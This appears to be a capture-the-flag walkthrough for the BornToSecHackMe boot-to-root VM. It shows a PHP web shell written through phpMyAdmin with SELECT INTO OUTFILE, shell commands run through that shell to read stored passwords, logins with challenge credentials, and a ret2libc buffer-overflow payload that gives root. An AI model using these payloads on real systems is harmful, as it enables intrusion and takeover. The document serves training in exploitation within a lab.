## phpmyadmin

Login with `root/Fg-'kKXBj87E:aJ$`

```
SELECT "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>" INTO OUTFILE '/var/www/forum/templates_c/shell.php'
```
We injected our shell into a file `shell.php` under directory `/var/www/forum/templates_c` which we have write permission.

```
$ curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=whoami'
www-data
$ curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=find+/home+-user+www-data'
/home
/home/LOOKATME
/home/LOOKATME/password
$ curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=cat+/home/LOOKATME/password'
lmezard:G!@M6f4Eatau{sF"
```

## FTP
Login with `lmezard:G!@M6f4Eatau{sF"`

```
$ ftp lmezard@$VMIP
Connected to 192.168.57.2.
220 Welcome on this server
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.

$ cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

```
$ file fun
fun: POSIX tar archive (GNU)
$ tar -xf fun
```

```
$ printf 'Iheartpwnage' | shasum -a 256
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

## ssh laurie
Login with `laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.
```
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

```
laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```
Now we have the password for thor `Publicspeakingisveryeasy.126241207201b2149opekmq426315`. According to a Slack thread, these is an error in the ISO file, the real password is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`.

## ssh thor
Login with `thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135`
```
thor@BornToSecHackMe:~$ cat README
Finish this challenge and use the result as password for 'zaz' user.
```

The filename itself is a hint. We need to play with a Python lib called [turtle](https://docs.python.org/3/library/turtle.html).

## ssh zaz

Login with `zaz:646da671ca01bb5d84dbb5fb2238dc8e`.

```
zaz@BornToSecHackMe:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble main" exploit_me
   0x0804841d <+41>:	mov    DWORD PTR [esp],eax
=> 0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    eax,[esp+0x10]
```
`exploit_me` calls `strcpy` function to copy our input `argv[1]` directly into a buffer without checking its size. We can simply overwrite `eip`.


```
zaz@BornToSecHackMe:~$ gdb -q exploit_me
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) break *0x08048420
Breakpoint 1 at 0x8048420
(gdb) run 42
Starting program: /home/zaz/exploit_me 42

Breakpoint 1, 0x08048420 in main ()
(gdb) info registers eax
eax            0xbffff6d0	-1073744176
(gdb) info frame
Stack level 0, frame at 0xbffff760:
 eip = 0x8048420 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff758, args:
 Locals at 0xbffff758, Previous frame's sp is 0xbffff760
 Saved registers:
  ebp at 0xbffff758, eip at 0xbffff75c
(gdb) print 0xbffff75c - 0xbffff6d0
$1 = 140
```
We got offset 140 by calculate `eip - eax`.

```
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
```
We found all the information to do a `ret2libc` attack.

```
zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . pack("V", 0xb7e6b060) . pack("V", 0xb7e5ebe0) . pack("V", 0xb7f8cc58)'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X��
# whoami
root
```
